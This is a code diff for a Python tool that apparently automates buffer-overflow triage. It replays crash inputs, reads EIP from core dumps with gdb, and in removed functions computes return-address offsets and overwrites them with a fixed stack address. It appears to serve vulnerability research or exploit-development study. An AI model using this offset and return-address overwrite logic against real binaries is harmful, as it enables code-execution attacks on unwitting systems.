@@ -48,11 +48,12 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
         sys.exit(1)
 
 
-def root_cause_analysis(crash_input: bytes, target_bin: str):
+def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
     """
     Triggers a test crash with the given input and extracts information from the resulting core dump.
     Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
     the return address, causing EIP hijacking.
+
 
     Parameters:
     crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
@@ -62,6 +63,55 @@ def root_cause_analysis(crash_input: bytes, target_bin: str):
     Returns:
     bool: True if the payload successfully reached and affected the return address.
     """
+
+    #performs the crash 
+    target_bin = arg_config.target
+
+    command = build_command(arg_config, crash_input)
+    print(command)
+
+    crash_proc = subprocess.Popen(
+        command,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        text=True
+    )
+
+    #sending the crash input from stdin to all targets
+    crash_proc.communicate(input=crash_input.decode())
+
+    core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"
+
+    gdb_proc = subprocess.Popen(
+        [f"gdb -q {target_bin} {core_path}"], 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        shell=True, 
+        text=True
+    )
+
+    gdb_proc.stdin.write("info registers\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("q\n")
+    gdb_proc.stdin.write("y\n")
+    gdb_proc.stdin.flush()
+
+    output, _ = gdb_proc.communicate()
+
+    print(output)
+    
+    eip_value = None
+    for line in output.splitlines():
+        if "eip" in line:  # Find the line with 'eip'
+            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
+            break
+    print(eip_value)
+
+
+    return
 
 
 
@@ -124,129 +174,6 @@ def locate_ra(pattern, target):
     # print(f"offset: {offset}")
     return offset
 
-
-def locate_ra3(pattern, target):
-    gdb_proc = subprocess.Popen(
-        [f"gdb -q {target}"], 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        shell=True, 
-        text=True
-    )
-
-    #send the pattern to the gdb target proc from both the arguments and stdin 
-    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
-    commands = f"""
-    set pagination off
-    r c
-    {pattern.decode('latin-1')}
-    """
-
-    gdb_proc.stdin.write(commands)
-    gdb_proc.stdin.flush()
-
-    while True:
-        output = gdb_proc.stdout.readline()
-        # print(output)
-        if "Program received signal SIGSEGV" in output:
-            print(output)
-            break
-
-    gdb_proc.stdin.write("info registers\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("bt\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("q\n")
-    gdb_proc.stdin.write("y\n")
-    gdb_proc.stdin.flush()
-
-    output, _ = gdb_proc.communicate()
-
-    print(output)
-    # print(pattern)
-    
-    eip_value = None
-    for line in output.splitlines():
-        if "eip" in line:  # Find the line with 'eip'
-            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
-            break
-
-    print(eip_value)
-
-    offset = cyclic_find(0x66616166)
-    address = struct.pack("<I", 0xffffd5b4)
-    new_pattern = pattern[:offset] + address + pattern[offset + 4:]
-
-
-    #now run again with the new pattern
-
-    gdb_proc = subprocess.Popen(
-        [f"gdb -q {target}"], 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        shell=True, 
-        text=True
-    )
-
-    #send the pattern to the gdb target proc from both the arguments and stdin 
-    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
-    commands = f"""
-    set pagination off
-    r c
-    {new_pattern.decode('latin-1')}
-    """
-
-    gdb_proc.stdin.write(commands)
-    gdb_proc.stdin.flush()
-
-    while True:
-        output = gdb_proc.stdout.readline()
-        # print(output)
-        if "Program received signal SIGSEGV" in output:
-            break
-
-    gdb_proc.stdin.write("info frame\n")
-    gdb_proc.stdin.flush()
-
-
-    gdb_proc.stdin.write("info registers\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("bt\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("q\n")
-    gdb_proc.stdin.write("y\n")
-    gdb_proc.stdin.flush()
-
-    output, _ = gdb_proc.communicate()
-
-    print(output)
-
-
-    return offset
-
-def locate_ra2(pattern, target):
-        
-    crash_proc = process(
-        [target, 
-        pattern.decode('latin-1')]
-    )
-        
-    crash_proc.sendline(pattern.decode('latin-1'))      #sending the crash pattern via stdin for the binaries that consume input from standard input
-
-    if crash_proc.poll(True) != 0:
-        print(f"Process crashed with return code {crash_proc.poll(True)}")
-
-    core = crash_proc.corefile          #problem with core files -> core dumps are piped in a program named apport that handles sensitive data ?? idek
-    if core != None:
-        print(f"eip val after crash: {core.eip}")
-    else:
-        print("No core file found")
 
         
 def target_ra(target):
